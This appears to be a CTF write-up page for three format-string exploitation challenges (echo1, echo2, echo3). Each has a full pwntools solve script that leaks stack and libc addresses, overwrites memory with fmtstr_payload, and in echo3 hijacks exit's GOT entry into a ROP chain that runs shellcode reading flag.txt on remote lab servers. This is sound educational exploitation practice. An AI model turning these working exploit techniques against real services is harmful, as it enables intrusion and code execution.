+++
title = "Week 05"
weight = 4
slug="week-05"
description = "- echo1: printf leaking stack values<br>- echo2: printf overwrite variable<br>- echo3: leaking libc and main, then overwriting the GOT entry for exit to jump to a ROPchain"
+++

# echo1
Just spammed `%p` and decoded the ASCII looking things.

Solve script:
``` py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./echo1_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("pwn.cybr.club", 7014)

    return r


def main():
    r = conn()
    # honestly just tried a bunch of format strings until I noticed the hex form of gigem when trying $p a bunch. Then I just printed the next several pointers and manually decoded and reversed the flag in cyberchef
    r.sendline(b'%14$p.%15$p.%16$p.%17$p.%18$p.%19$p.')
    print(r.recv())
    
if __name__ == "__main__":
    main()
```

# echo2
To figure out things like the address of main being `%19$p`, I first ran it in gdb with a breakpoint after the printf call and spammed %p into the input, then checked what each pointer on the stack corresponded to by disassembling/examinig the memory at each pointer.

Solve script:
``` py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./echo2_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("128.199.12.141", 7014)

    return r


def main():
    r = conn()

    # good luck pwning :)

    # first leak address of main to be able to get the offest to the global variable
    r.recvline()
    r.sendline(b'%19$p')
    main_addr = int(r.recvline(), 16)
    
    # pwntools go brr
    authorized_addr = main_addr + 0x2e8f
    writes = {authorized_addr: 0x1}
    payload = fmtstr_payload(6, writes)
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
```

# echo3
Very fun, try it yourself first if you can, seccomp is a funny thing. I had to try several things while debugging so there are probably unused gadgets lying around in the solve script, I'll go back and clean this up later.

Solve script:
```py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./echo3_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r)
    else:
        r = remote("128.199.12.141", 7015)

    return r


def main():
    r = conn()

    # good luck pwning :)
    r.sendline(b'%2$p')
    buf_addr = int(r.recvline(), 16)

    r.sendline(b'%21$p')
    main_addr = int(r.recvline(), 16)

    r.sendline(b'%17$p')
    libc_base = int(r.recvline(), 16) - 235 - libc.sym['__libc_start_main']

    print(hex(buf_addr))
    print(hex(main_addr))
    print(hex(libc_base))

    exit_addr = main_addr + 0x2ea3
    print('exit@got.plt:', hex(exit_addr))

    pop_pop_ret = 0x23a5c + libc_base

    print('pop_pop_ret', hex(pop_pop_ret))
    pop_pop_ret = p64(pop_pop_ret)

    for i in range(0, 8, 2):
        writes = {exit_addr+i: pop_pop_ret[i:i+2]}
        payload = fmtstr_payload(6, writes)        
        print(len(payload))
        r.sendline(payload)
    
    r.recv()

    syscall = p64(libc_base + 0xb58a5)
    write_addr = main_addr + 0x2e4b
    rdi_ret = p64(libc_base + 0x23a5f)
    rsi_ret = p64(libc_base + 0x2440e)
    rdx_rsi_ret = p64(libc_base + 0x106179)
    rax_ret = p64(libc_base + 0x3a638)
    rsp_r14_ret = p64(libc_base + 0xb4d9a)

    shellcode_addr = p64(main_addr - 0x11b5)
    shellcode = asm(shellcraft.cat('./flag.txt'))

    # funnily have to define payload1 before payload0 since it needs to know the length of what it is reading
    payload1 = b'A'*8 + rax_ret + p64(10) + rdi_ret + shellcode_addr + rdx_rsi_ret + p64(7) + p64(0x1000) + syscall
    payload1 += rax_ret + p64(0) + rdi_ret + p64(0) + rdx_rsi_ret + p64(len(shellcode)) + shellcode_addr + syscall
    payload1 += shellcode_addr

    # rax and rdi are already 0, no need to set them
    payload0 = rdx_rsi_ret + p64(len(payload1)) + p64(write_addr) + syscall + rsp_r14_ret + p64(write_addr)

    
    r.sendline(b'n' + b'\x00'*7 + payload0 + b'B'*(63-9-len(payload0)))
    r.send(payload1)
    r.sendline(shellcode)
    r.interactive()


if __name__ == "__main__":
    main()

```
